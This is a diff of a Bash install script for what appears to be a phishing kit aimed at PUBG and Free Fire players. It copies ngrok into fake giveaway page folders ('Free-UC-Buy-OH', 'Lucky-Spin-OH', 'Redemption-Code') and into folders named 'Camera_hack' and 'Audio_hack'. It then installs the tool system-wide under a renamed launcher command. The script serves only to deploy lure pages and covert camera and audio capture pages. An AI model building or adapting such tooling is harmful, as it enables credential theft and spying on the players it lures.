@@ -133,9 +133,8 @@ echo -e "\e[31m[\e[32m~\e[31m]\e[33m Done \e[m "
 sleep 2
 chmod +x ngrok
 chmod +x shark_logo
-cp -R ngrok phs/Free-UC-Buy-OH/
-cp -R ngrok phs/Lucky-Spin-OH/
-cp -R ngrok phs/BonusChallenge-Free-Gift-OH/
+cp -R ngrok phs/suman/
+cp -R ngrok phs/Redemption-Code/
 cp -R ngrok phs/Camera_hack
 cp -R shark_logo phs/Camera_hack
 cp -R shark_logo phs/Audio_hack
@@ -158,11 +157,11 @@ echo
 echo -e "\e[92m[+] Setting up Online Hacking Game Tool \e[m "
 echo
 cp -R phs /usr/bin
-cp -R onlinehacking-pubg /usr/bin
+cp -R kali-oh-freefire /usr/bin
 ###########XXXXXXXXXXXXX####################
 #     JUST LEARNING KEEP SUPPORTING        #
 ############XXXXXXXXXXXX####################
-echo -e "\e[92m[+] To run the tool from anywhere simply type : kali-oh-pubg \e[m "
+echo -e "\e[92m[+] To run the tool from anywhere simply type : kali-oh-freefire \e[m "
 echo 
 exit
 #####################################
